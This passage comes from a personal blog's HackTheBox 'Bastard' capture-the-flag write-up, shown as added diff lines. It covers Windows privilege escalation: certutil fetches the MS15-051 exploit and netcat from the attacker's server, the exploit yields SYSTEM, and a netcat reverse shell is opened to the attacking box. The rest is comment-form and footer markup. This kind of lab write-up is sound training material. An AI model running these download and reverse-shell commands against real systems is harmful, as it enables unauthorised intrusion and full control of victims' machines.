+<span class="go">PS C:\inetpub\drupal-7.54&gt; c:\windows\system32\certutil.exe -urlcache -split -f http://10.10.14.61:8000/ms15-051.exe ms15-051.exe</span>
+<span class="go">****  Online  ****</span>
+<span class="go">0000  ...</span>
+<span class="go">d800</span>
+<span class="go">CertUtil: -URLCache command completed successfully. dir                                                                                          </span>
+
+
+<span class="go">    Directory: C:\inetpub\drupal-7.54                                                                                   </span>
+
+
+<span class="go">Mode                LastWriteTime     Length Name                               </span>
+<span class="go">----                -------------     ------ ----                               </span>
+<span class="go">&lt;SNIP&gt;         &lt;SNIP&gt;</span>
+
+<span class="go">-a---          9/4/2020  10:10 ??     330189 ms15-051.exe                 </span>
+
+<span class="go">&lt;SNIP&gt;         &lt;SNIP&gt;p   </span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="go">PS C:\inetpub\drupal-7.54&gt; ./ms15-051.exe whoami</span>
+<span class="go">[#] ms15-051 fixed by zcgonvh</span>
+<span class="go">[!] process with pid: 2992 created.</span>
+<span class="go">==============================</span>
+<span class="go">nt authority\system</span>
+</pre></div>
+
+
+<p>Now, for some reasons I was unable to navigate to the administrator directory and grab the root flag using the <code>ms15-051.exe</code> from the cli. When I did try to read the file nothing was found. After few tries I then decided to get a full administrative shell. So downloaded a x64 version of netcat into the windows box:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\inetpub\drupal-7.54&gt; c:\windows\system32\certutil.exe -urlcache -split -f http://10.10.14.61:8000/nc64.exe nc64.exe        </span>
+<span class="go">****  Online  ****</span>
+<span class="go">0000  ...</span>
+<span class="go">b0d8</span>
+<span class="go">CertUtil: -URLCache command completed successfully.</span>
+</pre></div>
+
+
+<p>Then, after having started a netcat listener on my attacking box, I run the following command to get a shell as admin:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\inetpub\drupal-7.54&gt; ./ms15-051.exe &quot;nc64.exe -e cmd.exe 10.10.14.61 9999&quot;</span>
+</pre></div>
+
+
+<p>so I get the shell back:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]                                     </span>
+<span class="go">└──╼ $sudo nc -lnvp 9999                                   </span>
+<span class="go">[sudo] password for m4rc0:                               </span>
+<span class="go">listening on [any] 9999 ...                               </span>
+
+<span class="go">connect to [10.10.14.61] from (UNKNOWN) [10.10.10.9] 49179 </span>
+<span class="go">Microsoft Windows [Version 6.1.7600]</span>
+<span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>
+
+<span class="go">C:\inetpub\drupal-7.54&gt;c:\windows\system32\whoami</span>
+<span class="go">c:\windows\system32\whoami                                </span>
+<span class="go">nt authority\system </span>
+</pre></div>
+
+
+<p>and now I am able to read the root flag:</p>
+<div class="highlight"><pre><span></span><span class="go">C:#Users#Administrator#Desktop&gt;type root.txt.txt</span>
+
+<span class="go">type root.txt.txt</span>
+
+<span class="go">4b****************************7c</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Bastard.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Bastard"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
